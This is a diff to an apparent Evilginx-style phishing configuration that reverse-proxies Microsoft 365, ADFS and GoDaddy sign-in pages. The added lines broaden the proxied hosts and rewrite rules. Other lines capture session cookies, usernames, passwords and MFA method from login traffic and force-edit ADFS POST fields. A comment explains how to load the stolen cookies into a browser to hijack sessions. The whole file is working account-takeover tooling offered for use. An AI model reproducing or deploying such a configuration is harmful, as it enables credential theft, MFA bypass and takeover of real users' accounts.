@@ -1,12 +1,15 @@
-author: '@an0nud4y'
-min_ver: '2.3.0'
+name: 'Microsoft 365 with ADFS and Godaddy Bypass'
+
+min_ver: '3.1.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
   - {phish_sub: '', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: true}
   - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
   - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com:443', session: true, is_landing: false}
 
 ## ADD BELOW HOST ACCORDING TO THE SERVICE BEING USED TO LOGIN.
   - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
@@ -17,6 +20,8 @@ proxy_hosts:
 
 
 sub_filters:
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
@@ -53,9 +58,10 @@ sub_filters:
     
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp']         
+    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp']   	
   - domain: 'login.microsoftonline.com'
-    keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie', '.*,regexp']                
+    keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie', '.*,regexp']  
+    type: 'cookie'	
 
 # GUIDE TO GET SESSION FROM COOKIES
 # 1) Insert The Captured cookies in browser(Use Any Proper Extention)
@@ -64,13 +70,52 @@ auth_tokens:
 
 credentials:
   username:
-    key: ''
-    search: '"username":"([^"]*)'
-    type: 'json'
+
+    key: '(login|UserName)'
+
+    search: '(.*)'
+
+    type: 'post'
+
   password:
-    key: ''
-    search: '"password":"([^"]*)'
-    type: 'json'
+
+    key: '(passwd|Password|accesspass)'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  custom:
+
+    - key: 'mfaAuthMethod'
+
+      search: '(.*)'
+
+      type: 'post'
+
+login:
+
+  domain: 'login.microsoftonline.com'
+
+  path: '/'
+
+force_post:
+
+  - path: '/login.srf'
+
+    search:
+
+      - {key: 'wa', search: '.*'}
+
+      - {key: 'wresult', search: '.*'}
+
+      - {key: 'wctx', search: '.*'}
+
+    force:
+
+       - {key: 'wresult', search: 'http\:\/\/adfs\.example\.com\:443', value: 'http://adfs.example.com'}
+
+    type: 'post'
 # Use https://regex101.com to find appropriate regex format to match the post fields to capture.    
 login:
   domain: 'www.office.com'
